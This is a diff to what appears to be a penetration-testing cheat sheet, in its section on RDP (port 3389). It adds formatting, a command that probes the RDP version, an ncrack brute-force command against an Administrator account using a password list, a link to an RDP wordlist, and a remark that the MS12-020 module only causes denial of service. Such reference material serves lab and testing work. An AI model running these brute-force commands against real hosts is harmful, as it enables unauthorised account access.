@@ -713,15 +713,19 @@ class JConfig {
 [Back](#summary)
 
 ## Port 3389 - Remote Desktop Protocol
-Login with rdesktop or xfreerdp 
+* Login with rdesktop or xfreerdp 
 ```rdp
 rdesktop -u guest -p guest 10.11.1.5 -g 80%
 xfreerdp /v:(target) /u:(user) /p:(password)
 ```
-Brute force 
+* Brute force 
 ```bf
+rdesktop 192.168.1.101 //check version and sometimes username
 ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
 ```
+* [RDP Wordlist](https://raw.githubusercontent.com/jeanphorn/wordlist/master/rdp_passlist.txt)
+* msfconsole for ms12-020 is a dos attack; cant use
+
 
 ### MS12-020
 This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.
